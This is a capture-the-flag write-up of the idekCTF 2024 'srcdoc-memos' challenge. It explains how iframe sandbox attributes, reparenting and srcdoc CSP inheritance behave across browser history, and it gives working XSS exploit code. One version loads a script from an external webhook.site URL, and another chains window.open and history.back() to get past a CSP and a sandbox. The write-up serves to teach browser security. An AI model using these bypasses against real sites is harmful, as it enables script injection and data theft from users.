---
title: idekCTF 2024 Writeup - Advanced iframe Magic
date: 2024-09-07 11:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/idek-ctf-2024-iframe/cover-en.png
---

In idekCTF 2024, there was an interesting problem called srcdoc-memos from @icesfont, which involved a lot of knowledge related to iframes. I did not actually participate in the competition, but after the event, I looked at the problem and the solution, and it took me several days to finally understand why. It is definitely worth documenting the process and the solution.

Since this problem involves a lot of knowledge related to iframes, I will try to explain it step by step for better understanding.

<!-- more -->

## srcdoc-memos

Problem link: https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos

The code for this problem is as follows, with the goal of achieving XSS to steal a pre-set flag:

``` js
const escape = html => html
  .replaceAll('"', "&quot;")
  .replaceAll("<", "&lt;")
  .replaceAll(">", "&gt;");

const handler = (req, res) => {
  const url = new URL(req.url, "http://localhost");
  let memo;

  switch (url.pathname) {
  case "/":
    memo =
      cookie.parse(req.headers.cookie || "").memo ??
      `<h2>Welcome to srcdoc memos!</h2>\n<p>HTML is supported</p>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(`
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>

<h1>srcdoc memos</h1>
<div class="horizontal">
  <iframe srcdoc="${escape(memo)}"></iframe>
  <textarea name="memo" placeholder="<b>TODO</b>: ..." form="update">${escape(memo)}</textarea>
</div>
<form id="update" action="/memo">
  <input type="submit" value="update memo">
</form>
    `.trim());
    break;

  case "/memo":
    memo = url.searchParams.get("memo") ?? "";
    res.statusCode = 302;
    res.setHeader("Set-Cookie", cookie.serialize("memo", memo));
    res.setHeader("Location", "/");
    res.end();
    break;

  default:
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("not found");
  }
};
```

The functionality of the problem itself is quite simple. There is an API `/memo?memo=xxx` that can set cookies, and when accessing the index page, the content will be placed in `srcdoc`. But the most important part is that there is a script on the same page:

``` html
<script>
document.head.insertAdjacentHTML(
  "beforeend",
  \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
);
if (window.opener !== null) {
  console.error("has opener");
  document.documentElement.remove();
}
</script>
```

It mainly does two things:

1. Adds `script-src 'none'` CSP
2. If there is an opener, it removes the content

## Difficulties

Let's not worry about the opener for now; that one is easier to solve. The difficult part is the CSP.

After reading the problem, my thought process was as follows: since the CSP of `<iframe srcdoc>` inherits from its parent, if the upper layer has it, the lower layer must have it too. Therefore, we need to find a way to remove that CSP. Since we want to remove it, the only way I could think of is to add CSP through the `<iframe csp>` attribute, which can prevent that script from loading.

However, since the content of this problem is brought in through cookies, there will be same-site cookie restrictions. We cannot insert an iframe in our origin; the cookies will have issues. Therefore, we must use `<iframe csp>` at the problem's origin. Other than this, I can't think of any way to remove the CSP.

## Solution

The reason I said the opener is easier to solve is that I have seen similar problems before.

There are a few methods to make the opener null. The first one is similar to what appeared in [SekaiCTF 2022 - Obligatory Calc](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/#obligatory-calc). After executing `window.open`, quickly close itself, and `opener` will be null. The author of this problem, icesfont, used this method (if you test it in the console, you will find that nothing happens after execution because browsers by default cannot open a new window without user interaction, so the second open will be blocked):

``` js
function openNoOpener(url, name) {
  open(URL.createObjectURL(new Blob([`
    <script>
      open("${url}", "${name}");
      window.close();
    <\/script>
  `], { type: "text/html" })));
}
```

The second method I saw proposed by Jazzy in Discord is actually just to set the opener to null after opening:

``` js
function openNoOpener(url, name) {
  let w = window.open(url, name)
  w.opener = null
}
```

The reason this works is that right after opening, there is a short period when the opened window and the current window are same-origin, so during this time, it can be manipulated, and then it will be redirected to the desired URL.

Although the opener is lost, it seems to be disconnected from the opened window, but actually, it can be accessed again using the `name` attribute. I have written about this before: [iframe and window.open magic](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#windowopen).

After solving the opener issue, we can look at the other most troublesome part, which is that script. If we can prevent it from executing, it would be easy to achieve XSS. But how can we prevent it from executing? I have previously [written](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#iframes-csp) that there is an attribute called `csp` on iframes, and by adding it, we can set the CSP.

As mentioned earlier, due to same-site cookies, we need to directly use the problem's memo function to embed it. The code is as follows(modified from the exploit posted by Jazzy in Discord channel):

``` html
<script>
  const challengeHost = 'http://localhost:1337'
  function openNoOpener(url, name) {
    let w = window.open(url, name)
    w.opener = null
  }

  let html = `
    html
    <script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1"><\/script>
    <iframe csp="script-src http: https:" src="/"></iframe>
  `;

  openNoOpener(`${challengeHost}/memo?memo=${encodeURIComponent(html)}`, 'main');
</script>
```

Using CSP to prevent inline scripts from executing, and then reloading the webpage, will execute the originally prepared script. However, I actually tried it, and the latest version will have an error:

> Refused to display 'http://localhost:1337/' in a frame. The embedder requires it to enforce the following Content Security Policy: 'script-src http: https:'. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.

If the page originally does not have a CSP, it cannot be forcibly added. From post-match discussions, it seems that older versions of Chrome have less strict restrictions on same-origin CSP, so it can only work in older versions (though I'm not sure, and I'm too lazy to find an old version to test).

Next, let's talk about the expected solution, which involves a lot of knowledge related to iframes. I spent about a week gradually understanding why the expected solution can work. To make it easier to understand, I broke it down into several small parts, and following along should help you understand the final expected solution.

### 1. Navigation of iframes

Since an iframe is an independent window, it can also perform navigation to other places. Suppose there is an iframe on the webpage, and its original src is A. If you change the src to B, what happens when you press the back button (or execute `history.back()`)? There are two possibilities:

1. The entire webpage (top level) goes back to the previous page.
2. The iframe goes back to the previous page (from B to A).

The answer is 2, meaning that when you perform navigation, the iframe's history will also be added to the overall history.

Knowing this premise, we can look at a situation:

``` html
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
</body>
<script>
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
```

1. First, load test1 into the iframe and add a sandbox, so the script will not execute.
2. Press the loadTest2 button to remove the iframe's sandbox and navigate to test2, so the script will execute.

At this point, if you press the back button, the iframe will naturally return to test1. However, the sandbox may have two situations:

1. The sandbox also returns to the state when loading test1.
2. The sandbox maintains its current properties, meaning there is no sandbox.

The answer will be 2; the sandbox's properties do not change. Therefore, after pressing back, the sandbox is gone, and the script in test1 can now execute.

It actually feels quite reasonable, after all, you only changed the src, and did not modify the sandbox, so the sandbox remains in its latest state.

### 2. iframe reparenting and bfcache

The previous situation involved changing the sandbox and loading a new src, then going back to the previous page. Next, let's look at another situation where the first half is the same, but after loading a new src, we do not directly go back to the previous page; instead, we first navigate the entire webpage to another page and then go back:

``` html
<body>
  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.removeAttribute('sandbox')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
``` 

The testing process is:

1. Wait for the iframe to finish loading, and you will see test1 on the screen. At this point, because there is a sandbox, the script will not execute.
2. Press the load test2 button to remove the sandbox and load test2, causing the script to execute.
3. Press the top-level navigation to jump the webpage to another location.
4. Press the back button in the browser.

So what is the expected situation after pressing the back button? There will be two results based on whether there is a bfcache; first, let's look at the case with bfcache.

If there is a bfcache, pressing the back button will return to the same state as before, and you can observe:

1. The console does not show run, indicating that the script will not be executed again.
2. The iframe's src is test2.
3. The random number in test2 is the same as before, indicating that the script in the iframe has not been executed again.

After all, it's called bfcache, so it will completely retain the previous state without reloading the webpage.

What if there is no bfcache? Logically, the webpage should reload, so the expected situation would be as it was at the very beginning:

```html
<iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
```


This means that a sandboxed iframe loads test1.

However, if you actually press the back button, you'll find that the result is neither the initial sandbox + test1 nor the previous no sandbox + test2, but rather a combination of both: sandbox + test2.

In other words, the sandbox attribute maintains the latest state of the page, which is present, but the iframe's src is not the latest; it remains at the historical record of test2. When combined, it becomes sandboxed test2.

This mechanism of "when going back, the iframe's src returns to the last content" is called iframe reparenting. It seems there is no corresponding spec that fully describes it, and the implementations across different browsers vary.

This behavior can be summarized as: "I have a page loaded by an iframe in my history, and now that you've pressed back, to enhance user experience, I want to place this page back into the iframe." The paradox is that the attribute does not carry over the last one but directly uses the current page's.

If we reverse the process, it becomes a kind of iframe sandbox bypass:

``` html
<body>
  <iframe id=f src="data:text/html,test1:<script>document.writeln(Math.random())<\/script>"></iframe>
  <button onclick="loadTest2()">load test2</button>
  <button onclick="location = 'a.html'">top level navigation</button>
</body>
<script>
  console.log('run')
  function loadTest2() {
    f.setAttribute('sandbox', '')
    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
  }
</script>
``` 

We first load a safe test1 without the sandbox attribute, and then we want to load the malicious test2, so we add the sandbox attribute, thinking that this would be fine.

But little do we know that if you navigate the page elsewhere and then go back, you will encounter test2 without the sandbox.

In summary, remember that when you go back:

1. The sandbox attribute always follows the latest page.
2. The src will be the last loaded webpage.

### 3. Inheritance of CSP

If using iframe src, since it embeds another independent webpage, there is no relation between the CSPs of the two pages, and they do not affect each other. However, if using srcdoc, there is an inheritance relationship.

For example, with the following code:

``` html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
</head>
<body>
    <iframe srcdoc="Test:<script>document.writeln(Math.random())</script>"></iframe>
    <a href="a.html">top level navigation</a>
</body>
<script>
    console.log('run')
</script>
```

Due to the `script-src 'none'` CSP, scripts on the page will not execute, and scripts in the srcdoc will also not execute, because typically the CSP of an iframe srcdoc inherits from its parent, which sounds reasonable.

Next, let's try something similar to what we just did:

1. Confirm that there is a CSP on the page.
2. Confirm that the script in srcdoc cannot execute.
3. Press top-level navigation to go to another page.
4. Update the file and remove the CSP from the head.
5. Press back.

Assuming there is no bfcache, what will happen when I return to this webpage? The expected behavior should be: "Just like the first load," so the scripts on the page and the scripts in the srcdoc should have no CSP and should be able to execute code.

But the answer is:

1. The page indeed has no CSP, so the script can execute, and it prints run.
2. However, the script in srcdoc is blocked by the CSP and cannot execute.

This means that at this point, the CSP of the iframe srcdoc does not inherit from the current page but from the results in history, which causes this situation.

In technical terms, this is called session history and policy container. The CSP of the iframe comes from the policy container, and the stored results of this policy container are related to session history. However, since I haven't delved deeply into these two technical terms, I won't elaborate further.

### Putting It All Together

From the above points, we know a few things when you go back:

1. The sandbox attribute always follows the latest page.
2. The src will be the last loaded webpage.
3. The CSP of srcdoc will inherit the previous results.

The behavior of the sandbox is clearly different from the other two; it is the only one that follows the latest page, while the other two follow the last results.

Now, let's review the core code of the topic (I removed the check for opener for better understanding of the core concept):

``` js
res.end(`
  <script>
  document.head.insertAdjacentHTML(
    "beforeend",
    \`<meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
  );
  </script>
  <iframe srcdoc="${escape(memo)}"></iframe>
`.trim());
```

In the first step, we load a sandbox iframe, and the src will be our XSS payload:

``` js
const challengeHost = 'http://localhost:1337'

const xssPayload = `<script>alert(1)<\/script>`
const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=${xssPayload}">`
const win = window.open(`${challengeHost}/memo?memo=` + payload)
```

At this point, the content of this win will be:

``` html
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
  <iframe srcdoc='
    <iframe
      sandbox="allow-same-origin"
      src="/memo?memo=<script>alert(1)</script>">
    </iframe>
  '>
  </iframe>
</body>
```

If we zoom in a bit on that sandbox iframe, the content inside this iframe is:

``` html
<head></head> <!-- Empty head, no CSP -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```


Due to the sandbox, the script will not execute, so there will be no CSP. However, because of the sandbox, the script in the srcdoc will also not execute.

Next, we navigate to another page and open `/memo?memo=<iframe></iframe>`, at which point the content in the cookie will be replaced.

Then we use `history.back()` to go back. At this time, as mentioned earlier, the webpage will reload, so the HTML of the webpage becomes:


``` html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<body>
    <iframe srcdoc='
        <iframe></iframe>
    '>
    </iframe>
</body>
```

Although it looks empty, due to the reparenting behavior mentioned earlier, the content of that empty iframe will be the previous `/memo?memo=<script>alert(1)</script>`.

Next, also because of the previously mentioned characteristic: "the sandbox attribute always follows the current page," the sandbox of this iframe is now gone. Since the sandbox is gone, the content becomes:

``` html
<head>
    <meta http-equiv="Content-Security-Policy" content="script-src 'none';">
</head>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

Originally, the CSP was empty, but since the sandbox is gone, it has come back.

However, the last and most important point is that, as mentioned earlier: "the CSP of srcdoc will inherit the previous result," so this srcdoc's CSP is unrelated to the current page but inherits from the previous one. What was the previous CSP? It was empty, so the script can execute, successfully achieving XSS.

After removing the opener check from the problem, the exploit becomes much simpler and easier to understand:

``` html
<script>
  const challengeHost = 'http://localhost:1337'

  const xssPayload = `<script>alert(document.domain)<\/script>`
  const payload = `<iframe sandbox="allow-same-origin" src="/memo?memo=${xssPayload}">`
  const win = window.open(`${challengeHost}/memo?memo=` + payload)

  setTimeout(() => {
    const win2 = window.open(`${challengeHost}/memo?memo=<iframe></iframe>`)
    setTimeout(() => {
      win2.close()
      win.location = URL.createObjectURL(new Blob([`
        <script>
          setTimeout(() => {
           history.back();
          }, 500);
        <\/script>
      `], { type: "text/html" }));
    }, 1000)
  }, 1000)
</script>
```

This is the solution to the problem, mainly relying on the fact that when returning to the previous page, the sources of the sandbox and CSP are different, creating a difference that achieves XSS.

## Summary

According to the author, the inspiration for this problem came from this issue: [srcdoc and sandbox interaction with session history #6809](https://github.com/whatwg/html/issues/6809). While writing this, I also read this issue several times and conducted many experiments before finally understanding the intricacies. The key is to try it out yourself after reading; after a few attempts, you will likely understand how it works.

By the way, the author of this issue, Jake Archibald, is the host of [HTTP 203](https://www.youtube.com/playlist?list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9). This program should be familiar to front-end engineers, as it discusses many web-related topics. One of the must-read classics for front-end engineers, [Tasks, microtasks, queues and schedules](https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/), was also written by him.
